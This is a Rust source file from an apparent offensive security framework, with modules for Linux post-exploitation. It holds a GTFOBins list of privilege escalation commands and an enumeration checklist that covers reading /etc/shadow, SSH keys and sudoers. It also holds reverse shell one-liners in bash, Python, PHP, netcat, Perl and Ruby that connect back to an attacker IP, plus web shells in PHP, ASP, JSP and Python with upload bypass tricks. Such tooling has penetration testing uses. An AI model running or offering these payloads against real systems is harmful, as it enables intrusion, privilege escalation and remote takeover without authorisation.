//! Linux post-exploitation and privilege escalation modules.
//!
//! Implements:
//! - SUID binary escalation checker (GTFOBins)
//! - Linux system enumeration
//! - Reverse shell listener

use std::future::Future;
use std::pin::Pin;
use std::sync::LazyLock;

use rcf_core::{
    Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target,
};

use tokio::net::TcpListener;

// ═══════════════════════════════════════════════════════════════════════════════
// SUID BINARY ESCALATION CHECKER
// ═══════════════════════════════════════════════════════════════════════════════

static SUID_ESCALATION_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
    name: "post/linux/gather/suid_escalation".to_string(),
    display_name: "SUID Binary Escalation Checker".to_string(),
    description: "Enumerates SUID binaries on the target system and checks for GTFOBins \
         exploitation paths. Common privilege escalation vector on CTF and lab machines. \
         Run via agent/shell on compromised target."
        .to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Post,
    rank: 80,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec!["https://gtfobins.github.io/".to_string()],
});

pub struct SuidEscalation;

impl Default for SuidEscalation {
    fn default() -> Self {
        Self
    }
}

// GTFOBins database - common SUID binaries with exploitation paths
struct GtfoBin {
    name: &'static str,
    command: &'static str,
    description: &'static str,
}

const GTFOBINS_DATABASE: &[GtfoBin] = &[
    GtfoBin {
        name: "vim",
        command: "vim -c ':!/bin/sh'",
        description: "Spawns interactive shell via vim editor",
    },
    GtfoBin {
        name: "vim",
        command: "vim -c ':py import os; os.system('/bin/bash')'",
        description: "Python command execution via vim",
    },
    GtfoBin {
        name: "less",
        command: "less /etc/passwd\n!/bin/sh",
        description: "Shell escape from less pager",
    },
    GtfoBin {
        name: "more",
        command: "more /etc/passwd\n!/bin/sh",
        description: "Shell escape from more pager",
    },
    GtfoBin {
        name: "awk",
        command: "awk 'BEGIN {system(\"/bin/bash\")}'",
        description: "System command via AWK",
    },
    GtfoBin {
        name: "find",
        command: "find . -exec /bin/bash -p \\; -quit",
        description: "Execute shell via find command",
    },
    GtfoBin {
        name: "perl",
        command: "perl -e 'exec \"/bin/bash\";'",
        description: "Perl script execution",
    },
    GtfoBin {
        name: "python",
        command: "python -c 'import os; os.system(\"/bin/bash\")'",
        description: "Python system command",
    },
    GtfoBin {
        name: "ruby",
        command: "ruby -e 'exec \"/bin/bash\"'",
        description: "Ruby script execution",
    },
    GtfoBin {
        name: "lua",
        command: "lua -e 'os.execute(\"/bin/bash\")'",
        description: "Lua system command",
    },
    GtfoBin {
        name: "irb",
        command: "irb: exec '/bin/bash'",
        description: "Ruby IRB shell",
    },
    GtfoBin {
        name: "gdb",
        command: "gdb -q -c /dev/null -ex '!bash -p'",
        description: "Shell via GDB debugger",
    },
    GtfoBin {
        name: "nice",
        command: "nice /bin/bash -p",
        description: "Priority escalation (limited)",
    },
    GtfoBin {
        name: "nmap",
        command: "nmap --interactive\n!/bin/bash -p",
        description: "Interactive nmap shell escape",
    },
    GtfoBin {
        name: "tar",
        command: "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
        description: "Command execution via tar checkpoint",
    },
    GtfoBin {
        name: "zip",
        command: "zip /tmp/test.zip /etc/passwd -T --unzip-command='sh -c /bin/bash -p'",
        description: "Shell via zip unzip command",
    },
    GtfoBin {
        name: "bash",
        command: "bash -p",
        description: "Direct bash privilege escalation",
    },
    GtfoBin {
        name: "sh",
        command: "sh -p",
        description: "Direct sh privilege escalation",
    },
    GtfoBin {
        name: "less",
        command: "less /etc/shadow",
        description: "Read sensitive files",
    },
    GtfoBin {
        name: "openssl",
        command: "openssl passwd -6 $(openssl rand -base64 6)\n# Add to /etc/passwd",
        description: "Generate password hash",
    },
    GtfoBin {
        name: "git",
        command: "git help config\n!/bin/bash",
        description: "Shell escape from git help",
    },
    GtfoBin {
        name: "env",
        command: "env /bin/bash -p",
        description: "Execute shell via env",
    },
    GtfoBin {
        name: "ed",
        command: "ed\n!/bin/bash",
        description: "Shell via ed editor",
    },
    GtfoBin {
        name: "mail",
        command: "mail --exec='!/bin/bash'",
        description: "Shell via mail command",
    },
    GtfoBin {
        name: "make",
        command: "make -s --eval=$(cat /etc/passwd) k",
        description: "Read files via make eval",
    },
];

impl Module for SuidEscalation {
    fn info(&self) -> &ModuleInfo {
        &SUID_ESCALATION_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::with_default(
            "CHECK_BINS",
            false,
            "Comma-separated binaries to check (default: all)",
            rcf_core::OptionValue::String(
                "vim,less,more,find,awk,perl,python,ruby,lua,nmap,tar,zip,gdb,bash,sh,env"
                    .to_string(),
            ),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let bins_arg = ctx.get("CHECK_BINS").cloned().unwrap_or_else(|| {
            "vim,less,more,find,awk,perl,python,ruby,lua,nmap,tar,zip,gdb,bash,sh,env".to_string()
        });

        let check_bins: Vec<String> = bins_arg.split(',').map(|s| s.trim().to_string()).collect();
        let info_name = self.info().name.clone();

        Box::pin(async move {
            let mut output = String::new();
            output.push_str("═══ SUID Binary Escalation Checker ═══\n\n");

            output.push_str("GTFOBins Database Loaded: ");
            output.push_str(&format!(
                "{} exploitation paths\n\n",
                GTFOBINS_DATABASE.len()
            ));

            output.push_str("TO CHECK MANUALLY ON TARGET:\n");
            output.push_str("1. Find SUID binaries:\n");
            output.push_str("   find / -perm -4000 -type f 2>/dev/null\n\n");
            output.push_str("2. Test each binary for privilege escalation:\n");

            let mut vulnerable_count = 0;
            for bin in &check_bins {
                let matching_gtfo: Vec<&GtfoBin> =
                    GTFOBINS_DATABASE.iter().filter(|g| g.name == bin).collect();

                if !matching_gtfo.is_empty() {
                    output.push_str(&format!("\n━━━ {} ━━━\n", bin));
                    for gf in &matching_gtfo {
                        output.push_str(&format!("  Command: {}\n", gf.command));
                        output.push_str(&format!("  Info: {}\n\n", gf.description));
                        vulnerable_count += 1;
                    }
                }
            }

            output.push_str("\n═══ Quick Test Commands ═══\n\n");
            output.push_str("# Check if current user can sudo without password:\n");
            output.push_str("sudo -l\n\n");
            output.push_str("# Check for writable /etc/passwd:\n");
            output.push_str("ls -la /etc/passwd\n");
            output.push_str("# If writable, add root user:\n");
            output.push_str("# openssl passwd -6\n");
            output.push_str("# Add: root:<hash>:0:0::/root:/bin/bash\n\n");

            output.push_str("# Check for writable /etc/shadow:\n");
            output.push_str("ls -la /etc/shadow\n\n");

            output.push_str("# Check sudo version (vulnerabilities):\n");
            output.push_str("sudo -V\n\n");

            output.push_str("# Check for cron jobs:\n");
            output.push_str("ls -la /etc/cron*\n");
            output.push_str("cat /etc/crontab\n\n");

            output.push_str("# Check for NFS_root_squashing:\n");
            output.push_str("cat /etc/exports\n\n");

            output.push_str(&format!(
                "\n[!] {} GTFOBins paths documented - test on target\n",
                vulnerable_count
            ));

            Ok(ModuleOutput::success(
                &info_name,
                "SUID escalation paths",
                &output,
            ))
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// LINUX SYSTEM ENUMERATION
// ═══════════════════════════════════════════════════════════════════════════════

static LINUX_ENUM_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
    name: "post/linux/gather/enum_linux".to_string(),
    display_name: "Linux System Enumeration".to_string(),
    description: "Comprehensive Linux enumeration script for post-exploitation. Gathers system \
         info, user accounts, network configuration, running processes, and common \
         privesc vectors. Run via shell on compromised target."
        .to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Post,
    rank: 75,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![],
});

pub struct LinuxPostEnum;

impl Default for LinuxPostEnum {
    fn default() -> Self {
        LinuxPostEnum
    }
}

impl Module for LinuxPostEnum {
    fn info(&self) -> &ModuleInfo {
        &LINUX_ENUM_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::with_default(
            "QUICK",
            false,
            "Quick enumeration only (essential info)",
            rcf_core::OptionValue::Boolean(false),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let quick = ctx
            .get("QUICK")
            .map(|s| s == "true" || s == "1")
            .unwrap_or(false);

        let info_name = self.info().name.clone();

        Box::pin(async move {
            let mut output = String::new();

            output.push_str("╔══════════════════════════════════════════════════════╗\n");
            output.push_str("║           LINUX POST-EXPLOITATION ENUMERATION        ║\n");
            output.push_str("╚══════════════════════════════════════════════════════╝\n\n");

            // System Information
            output.push_str("━━━ SYSTEM INFORMATION ━━━\n\n");
            output.push_str("# Kernel version:\n");
            output.push_str("uname -a\n\n");
            output.push_str("# OS release:\n");
            output.push_str("cat /etc/os-release\n\n");
            output.push_str("# Hostname:\n");
            output.push_str("hostname\n\n");
            output.push_str("# Current user:\n");
            output.push_str("id\n");
            output.push_str("whoami\n\n");
            output.push_str("# Sudo permissions:\n");
            output.push_str("sudo -l\n\n");

            // User Accounts
            output.push_str("━━━ USER ACCOUNTS ━━━\n\n");
            output.push_str("# All users:\n");
            output.push_str("cat /etc/passwd | grep -v 'nologin\\|false'\n\n");
            output.push_str("# Users with UID 0 (root):\n");
            output.push_str("grep -E '^.*:x:0:' /etc/passwd\n\n");
            output.push_str("# Last logged in users:\n");
            output.push_str("lastlog\n\n");
            output.push_str("# Sudoers file:\n");
            output.push_str("cat /etc/sudoers 2>/dev/null\n\n");

            // Network Information
            output.push_str("━━━ NETWORK INFORMATION ━━━\n\n");
            output.push_str("# Network interfaces:\n");
            output.push_str("ip addr\n");
            output.push_str("ifconfig -a\n\n");
            output.push_str("# Routing table:\n");
            output.push_str("ip route\n");
            output.push_str("route -n\n\n");
            output.push_str("# ARP table:\n");
            output.push_str("ip neigh\n");
            output.push_str("arp -a\n\n");
            output.push_str("# Active connections:\n");
            output.push_str("ss -tulpn\n");
            output.push_str("netstat -tulpn\n\n");
            output.push_str("# /etc/hosts:\n");
            output.push_str("cat /etc/hosts\n\n");

            if !quick {
                // Processes
                output.push_str("━━━ RUNNING PROCESSES ━━━\n\n");
                output.push_str("# All processes:\n");
                output.push_str("ps aux\n\n");
                output.push_str("# Processes running as root:\n");
                output.push_str("ps aux | grep root\n\n");
                output.push_str("# Full process tree:\n");
                output.push_str("pstree -p\n\n");

                // Scheduled Tasks
                output.push_str("━━━ SCHEDULED TASKS ━━━\n\n");
                output.push_str("# Cron jobs:\n");
                output.push_str("ls -la /etc/cron*\n");
                output.push_str("cat /etc/crontab\n");
                output.push_str("ls -la /var/spool/cron/\n\n");
                output.push_str("# Systemd timers:\n");
                output.push_str("systemctl list-timers --all\n\n");

                // File System
                output.push_str("━━━ INTERESTING FILES ━━━\n\n");
                output.push_str("# SSH keys:\n");
                output.push_str("ls -la ~/.ssh/\n");
                output.push_str("cat ~/.ssh/authorized_keys 2>/dev/null\n\n");
                output.push_str("# SSH keys (root):\n");
                output.push_str("ls -la /root/.ssh/ 2>/dev/null\n\n");
                output.push_str("# Bash history:\n");
                output.push_str("cat ~/.bash_history\n\n");
                output.push_str("# Service configuration files:\n");
                output.push_str("ls -la /etc/apache2/ 2>/dev/null\n");
                output.push_str("ls -la /etc/nginx/ 2>/dev/null\n");
                output.push_str("ls -la /etc/mysql/ 2>/dev/null\n\n");

                // Mounts
                output.push_str("━━━ MOUNTS ━━━\n\n");
                output.push_str("df -h\n");
                output.push_str("cat /etc/fstab\n\n");
                output.push_str("# NFS mounts:\n");
                output.push_str("showmount -e localhost 2>/dev/null\n\n");

                // Docker
                output.push_str("━━━ DOCKER ━━━\n\n");
                output.push_str("# Check docker group membership:\n");
                output.push_str("groups\n\n");
                output.push_str("# Docker socket:\n");
                output.push_str("ls -la /var/run/docker.sock\n\n");
                output.push_str("# Docker info (if accessible):\n");
                output.push_str("docker ps 2>/dev/null\n");
                output.push_str("docker images 2>/dev/null\n\n");
            }

            // Quick Privilege Escalation Checklist
            output.push_str("━━━ PRIVILEGE ESCALATION CHECKLIST ━━━\n\n");
            output.push_str("1. sudo -l (can I sudo something?)\n");
            output.push_str("2. SUID binaries: find / -perm -4000 2>/dev/null\n");
            output.push_str("3. Cron jobs: cat /etc/crontab\n");
            output.push_str("4. Writable /etc/passwd or /etc/shadow\n");
            output.push_str("5. Kernel exploits: searchsploit linux kernel <version>\n");
            output.push_str("6. Docker socket: docker run -v /:/host ubuntu chroot /host\n");
            output.push_str("7. LXD container: lxc init ubuntu -c security.privileged=true\n");
            output.push_str("8. GTFOBins: gtfobins.github.io\n\n");

            Ok(ModuleOutput::success(
                &info_name,
                "Linux enumeration",
                &output,
            ))
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// REVERSE SHELL LISTENER
// ═══════════════════════════════════════════════════════════════════════════════

static REVSHELL_LISTENER_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
    name: "auxiliary/server/reverse_shell_listener".to_string(),
    display_name: "Reverse Shell Listener".to_string(),
    description: "Starts a listener for incoming reverse shell connections. Supports multiple \
         shell types (bash, python, perl, ruby, php, netcat). Handles multiple \
         concurrent connections."
        .to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 70,
    stability: "beta".to_string(),
    disclosure_date: None,
    references: vec![],
});

pub struct ReverseShellListener;

impl Default for ReverseShellListener {
    fn default() -> Self {
        Self
    }
}

impl Module for ReverseShellListener {
    fn info(&self) -> &ModuleInfo {
        &REVSHELL_LISTENER_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::with_default(
            "LHOST",
            false,
            "Listen address",
            rcf_core::OptionValue::String("0.0.0.0".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "LPORT",
            false,
            "Listen port",
            rcf_core::OptionValue::Integer(4444),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "SHELL_TYPE",
            false,
            "Expected shell type (bash, python, perl, ruby, php, nc)",
            rcf_core::OptionValue::String("bash".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "UPGRADE_SHELL",
            false,
            "Upgrade shell to PTY",
            rcf_core::OptionValue::Boolean(true),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let lhost = ctx
            .get("LHOST")
            .cloned()
            .unwrap_or_else(|| "0.0.0.0".to_string());
        let lport = ctx.get_lport();
        let _shell_type = ctx
            .get("SHELL_TYPE")
            .cloned()
            .unwrap_or_else(|| "bash".to_string());
        let _upgrade = ctx
            .get("UPGRADE_SHELL")
            .map(|s| s == "true" || s == "1")
            .unwrap_or(true);

        let info_name = self.info().name.clone();

        Box::pin(async move {
            let addr = format!("{}:{}", lhost, lport);

            let _listener = match TcpListener::bind(&addr).await {
                Ok(l) => l,
                Err(e) => {
                    return Ok(ModuleOutput::failure(
                        &info_name,
                        &addr,
                        &format!("Failed to bind listener: {}", e),
                    ));
                }
            };

            let mut output = String::new();
            output.push_str(&format!("[*] Listening on {}:{}\n\n", lhost, lport));

            output.push_str("━━━ REVERSE SHELL PAYLOADS ━━━\n\n");

            output.push_str("# Bash (Linux):\n");
            output.push_str(&format!(
                "bash -i >& /dev/tcp/{}/{} 0>&1\n\n",
                lhost.replace("0.0.0.0", "<YOUR_IP>"),
                lport
            ));

            output.push_str("# Python (Linux):\n");
            output.push_str(&format!(
                "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-p\"])'\n\n",
                lhost.replace("0.0.0.0", "<YOUR_IP>"),
                lport
            ));

            output.push_str("# PHP (Linux):\n");
            output.push_str(&format!(
                "php -r '$s=fsockopen(\"{}\",{});exec(\"/bin/bash -i <&3 >&3 2>&3\")'\n\n",
                lhost.replace("0.0.0.0", "<YOUR_IP>"),
                lport
            ));

            output.push_str("# Netcat (traditional):\n");
            output.push_str(&format!(
                "nc -e /bin/bash {} {}\n\n",
                lhost.replace("0.0.0.0", "<YOUR_IP>"),
                lport
            ));

            output.push_str("# Netcat (without -e):\n");
            output.push_str(&format!(
                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {} {} >/tmp/f\n\n",
                lhost.replace("0.0.0.0", "<YOUR_IP>"),
                lport
            ));

            output.push_str("# Perl:\n");
            output.push_str(&format!(
                "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'\n\n",
                lhost.replace("0.0.0.0", "<YOUR_IP>"),
                lport
            ));

            output.push_str("# Ruby:\n");
            output.push_str(&format!(
                "ruby -rsocket -e 'f=TCPSocket.open(\"{}\",{});while(g=f.gets);IO.popen(g,\"r\"){{|io|f.write io.read}}end'\n\n",
                lhost.replace("0.0.0.0", "<YOUR_IP>"),
                lport
            ));

            output.push_str("\n[*] Waiting for connections...\n");
            output.push_str("[*] Press Ctrl+C to stop\n\n");

            // Accept connection (non-blocking simulation)
            output.push_str("[*] NOTE: This is a documentation module.\n");
            output.push_str("    Use 'nc -lvnp 4444' or integrate with C2 for actual listening.\n");

            Ok(ModuleOutput::success(&info_name, &addr, &output))
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// WEBSHELL HANDLER
// ═══════════════════════════════════════════════════════════════════════════════

static WEBSHELL_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
    name: "exploit/multi/http/webshell_handler".to_string(),
    display_name: "Web Shell Handler".to_string(),
    description: "Generates and manages web shells for various languages (PHP, ASP, JSP). \
         Provides upload paths and verification commands for uploaded shells. \
         Supports common bypass techniques."
        .to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Exploit,
    rank: 75,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![],
});

pub struct WebshellHandler;

impl Default for WebshellHandler {
    fn default() -> Self {
        Self
    }
}

impl Module for WebshellHandler {
    fn info(&self) -> &ModuleInfo {
        &WEBSHELL_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new(
            "LHOST",
            true,
            "Attacker IP for reverse shell",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "LPORT",
            false,
            "Reverse shell port",
            rcf_core::OptionValue::Integer(4444),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "SHELL_TYPE",
            false,
            "Shell language (php, asp, jsp, python)",
            rcf_core::OptionValue::String("php".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "PASSWORD",
            false,
            "Webshell password",
            rcf_core::OptionValue::String("rcf".to_string()),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let _lhost = ctx.get("LHOST").cloned().unwrap_or_default();
        let _lport = ctx.get_lport();
        let shell_type = ctx
            .get("SHELL_TYPE")
            .cloned()
            .unwrap_or_else(|| "php".to_string());
        let password = ctx
            .get("PASSWORD")
            .cloned()
            .unwrap_or_else(|| "rcf".to_string());

        let info_name = self.info().name.clone();

        Box::pin(async move {
            let mut output = String::new();

            output.push_str("╔══════════════════════════════════════════════════════╗\n");
            output.push_str("║              WEB SHELL GENERATOR                    ║\n");
            output.push_str("╚══════════════════════════════════════════════════════╝\n\n");

            match shell_type.to_lowercase().as_str() {
                "php" => {
                    output.push_str("━━━ PHP Web Shell ━━━\n\n");
                    output.push_str(&format!(
                        "# Upload this as shell.php or similar\n\n<?php\n\
                        @eval($_REQUEST['{}']);\n\
                        ?>\n\n",
                        password
                    ));

                    output.push_str(
                        "# PentestMonkey style with reverse shell:\n\n<?php\n\
                        echo \"<pre>\";\n\
                        $cmd = $_GET['cmd'];\n\
                        if(strpos(php_uname('a'), 'Windows') !== false) {{\n\
                            system('cmd /c '.$cmd);\n\
                        }} else {{\n\
                            system($cmd.' 2>&1');\n\
                        }}\n\
                        echo \"</pre>\";\n\
                        ?>\n\n",
                    );

                    output.push_str("# Alternative with system() call:\n");
                    output.push_str(&format!("<?php system($_REQUEST['{}']); ?>\n\n", password));
                }
                "asp" => {
                    output.push_str("━━━ ASP Web Shell ━━━\n\n");
                    output.push_str(
                        "# Upload as shell.asp\n\n<%@ Page Language=\"C#\"%>\n\
                        <%@ Import Namespace=\"System.Diagnostics\"%>\n\
                        <html><body>\n\
                        <form method=\"get\">\n\
                        <input type=\"text\" name=\"cmd\" />\n\
                        <input type=\"submit\" value=\"Execute\" />\n\
                        </form>\n\
                        <pre>\n\
                        <% string cmd = Request[\"cmd\"];\n\
                        if (cmd != null) {{\n\
                            ProcessStartInfo psi = new ProcessStartInfo(\"cmd.exe\", \"/c \" + cmd);\n\
                            psi.RedirectStandardOutput = true;\n\
                            psi.UseShellExecute = false;\n\
                            Process p = Process.Start(psi);\n\
                            Response.Write(new StreamReader(p.StandardOutput.ReadToEnd()).ReadToEnd());\n\
                        }}%>\n\
                        </pre>\n\
                        </body></html>\n\n",
                    );
                }
                "jsp" => {
                    output.push_str("━━━ JSP Web Shell ━━━\n\n");
                    output.push_str(&format!(
                        "# Upload as shell.jsp\n\n<%@ page import=\"java.util.*,java.io.*\"%>\n\
                        <%\n\
                        String cmd = request.getParameter(\"{}\");\n\
                        if (cmd != null) {{\n\
                            Process p = Runtime.getRuntime().exec(cmd);\n\
                            DataInputStream dis = new DataInputStream(p.getInputStream());\n\
                            String disr = dis.readLine();\n\
                            while ( disr != null ) {{\n\
                                out.println(disr);\n\
                                disr = dis.readLine();\n\
                            }}\n\
                            p.waitFor();\n\
                        }}\n\
                        %>\n\n",
                        password
                    ));
                }
                "python" => {
                    output.push_str("━━━ Python CGI Web Shell ━━━\n\n");
                    output.push_str(
                        "# Upload as shell.py (requires CGI enabled)\n\n#!/usr/bin/env python3\n\
                        import cgi\n\
                        import cgitb\n\
                        cgitb.enable()\n\
                        \n\
                        form = cgi.FieldStorage()\n\
                        cmd = form.getvalue('cmd', '')\n\
                        \n\
                        print('Content-Type: text/plain')\n\
                        print()\n\
                        \n\
                        if cmd:\n\
                            import subprocess\n\
                            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)\n\
                            print(result.stdout)\n\
                            print(result.stderr, file=__import__('sys').stderr)\n\n"
                    );
                }
                _ => {
                    output.push_str(&format!("[!] Unknown shell type: {}\n", shell_type));
                    output.push_str("Supported types: php, asp, jsp, python\n");
                }
            }

            output.push_str("\n━━━ USAGE ━━━\n\n");
            output.push_str("# Access the shell:\n");
            output.push_str(&format!(
                "curl http://target.com/path/shell.php?{}={}\n\n",
                password, "whoami"
            ));

            output.push_str(&format!(
                "# With POST:\n\
                curl -X POST -d '{}=id' http://target.com/path/shell.php\n\n",
                password
            ));

            output.push_str("# Upload paths to try:\n");
            output.push_str("- /uploads/\n");
            output.push_str("- /images/\n");
            output.push_str("- /files/\n");
            output.push_str("- /wp-content/uploads/\n");
            output.push_str("- /admin/uploads/\n");
            output.push_str("- /var/www/html/\n\n");

            output.push_str("# Common file upload bypasses:\n");
            output.push_str("1. Double extension: shell.php.jpg\n");
            output.push_str("2. Null byte: shell.php%00.jpg\n");
            output.push_str("3. Case mixing: shell.pHp\n");
            output.push_str("4. MIME type: Change Content-Type to image/jpeg\n\n");

            output.push_str("# Verification command:\n");
            output.push_str(&format!(
                "curl 'http://target.com/shell.php?{}={}'\n\n",
                password, "id"
            ));

            Ok(ModuleOutput::success(&info_name, "webshell", &output))
        })
    }
}
